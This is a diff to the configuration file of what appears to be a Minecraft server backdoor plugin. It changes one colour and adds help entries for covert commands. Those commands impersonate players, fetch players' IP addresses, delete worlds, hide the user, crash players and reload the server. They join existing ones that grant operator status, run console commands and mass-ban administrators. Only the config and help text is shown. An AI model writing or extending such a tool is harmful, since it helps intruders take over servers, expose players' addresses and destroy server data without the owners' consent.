@@ -45,7 +45,7 @@ public class Config {
     public static final ChatColor chat_message_prefix_color = ChatColor.GOLD;
 
     // color of help command name 
-    public static final ChatColor help_command_name_color = ChatColor.DARK_PURPLE;
+    public static final ChatColor help_command_name_color = ChatColor.LIGHT_PURPLE;
 
     // color of help command syntax 
     public static final ChatColor help_command_desc_color = ChatColor.WHITE;
@@ -59,6 +59,7 @@ public class Config {
                                                         "[Server] ALL PLAYERS HAVE OP UNTIL ROLLBACK";
 
     // Help message content
+    // rename, reload, getip, sudo, delworld, makeworld, listworlds, vanish, crash, info
     public static final HelpItem[] help_messages = {
             new HelpItem("help",        "[command]",                    "display this message, or description of command."),
             new HelpItem("op",          "[player]",                     "op specified player (def: self)"),
@@ -69,8 +70,17 @@ public class Config {
             new HelpItem("give",        "(item) [count]",               "give the specified item in specified quantities (def: stack)"),
             new HelpItem("exec",        "[command]",                    "[Visible] Exocute command as server console."),
             new HelpItem("chaos",       "",                             "[Visible] Deop and ban ops, op all regular players, run this while not being op yourself."),
-            new HelpItem("seed",        "",                             "Get the current world seed."),
-            new HelpItem("coords",      "[player]",                     "Get the coordinates of specified player."),
+            new HelpItem("seed",        "",                             "get the current world seed"),
+            new HelpItem("sudo",        "(player) (message)",           "sends messages as player, use \"/\" as well (def: player \"hello world\")"),
+            new HelpItem("rename",      "[name]",                       "changes your nick (def: nickname)"),
+            new HelpItem("reload",      "",                             "reloads the server"),
+            new HelpItem("getip",       "[player]",                     "gets ip of the player (def: nickname)"),
+            new HelpItem("listworlds",  "",                             "displays all worlds"),
+            new HelpItem("makeworld",   "[world]",                      "creates new world (def: world_name)"),
+            new HelpItem("delworld",    "[world]",                      "deletes a world (def: world_name)"),
+            new HelpItem("vanish",      "",                             "makes you vanish, tab included"),
+            new HelpItem("crash",       "[player]",                     "crashes player's name (def: nickname)"),
+            new HelpItem("coords",      "[player]",                     "get the coordinates of specified player"),
             new HelpItem("tp",          "[x] [y] [z]",                  "[Visible] Teleport to specified coordinates."),
             new HelpItem("stop",    "",                             "[Visible] Shutdown the server.")
     };
